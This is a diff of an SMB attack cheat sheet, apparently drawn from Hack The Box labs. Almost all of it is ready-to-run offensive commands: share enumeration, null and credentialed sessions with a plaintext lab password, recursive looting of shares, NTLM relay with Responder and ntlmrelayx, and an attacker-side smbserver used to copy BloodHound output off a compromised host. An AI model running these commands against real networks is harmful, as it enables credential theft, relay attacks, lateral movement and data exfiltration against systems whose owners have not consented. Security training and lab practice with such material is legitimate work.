@@ -1,25 +1,32 @@
-- smbclient -L=<IP> --option='client min protocol=NT1'
-- smbmap -H 10.10.10.100 -R
-- smbmap -H 10.10.10.100 -R Replication
-- smbmap -H 10.10.10.100
-- smbclient -L 10.10.10.100
+#enumeration
+    - smbclient -L=<IP> --option='client min protocol=NT1'
+    - smbmap -H 10.10.10.100 -R
+    - smbmap -H 10.10.10.100 -R Replication
+    - smbmap -H 10.10.10.100
+    - smbclient -L 10.10.10.100
 ====================================================================================
 #session
-- smbclient \\\\10.10.10.100\\tmp
-- smbclient //10.10.10.100/tmp
-- smbmap -H 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
-- smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
-- smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
+    - smbclient \\\\10.10.10.100\\tmp      (NULL SESSION)
+    - smbclient //10.10.10.100/tmp         (NULL SESSION)
+    - smbmap -H 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+    - smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+    - smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
 =====================================================================================
 # In an smbclient interactive session ->  recursively download a SMB share's content
-smb: \> prompt off
-smb: \> recurse on
-smb: \> mget *
+    - smb: \> prompt off
+      smb: \> recurse on
+      smb: \> mget *
 
-smb: \> recurse on
-smb: \> dir
+    - smb: \> recurse on
+      smb: \> dir
 ======================================================================================
 # smb relay
-sudo python Responder.py -I eth0 -wdr -v
-sudo python ntlmrelayx.py -t 192.168.64.129 -smb2support
-sudo ntlmrelayx.py -6 -t ldaps://10.0.2.16 --delegate-access -wh attacker-wpad
+    - sudo python Responder.py -I eth0 -wdr -v
+    - sudo python ntlmrelayx.py -t 192.168.64.129 -smb2support
+    - sudo ntlmrelayx.py -6 -t ldaps://10.0.2.16 --delegate-access -wh attacker-wpad
+======================================================================================
+# smbserver - copy file between evil-wirm session and local attack machine
+    - sudo smbserver.py share . -smb2support -username df -password df
+      net use \\10.10.14.6\share /u:df df
+      net view \\10.10.14.6\ /u:df df
+      copy 20191018035324_BloodHound.zip \\10.10.14.6\share\
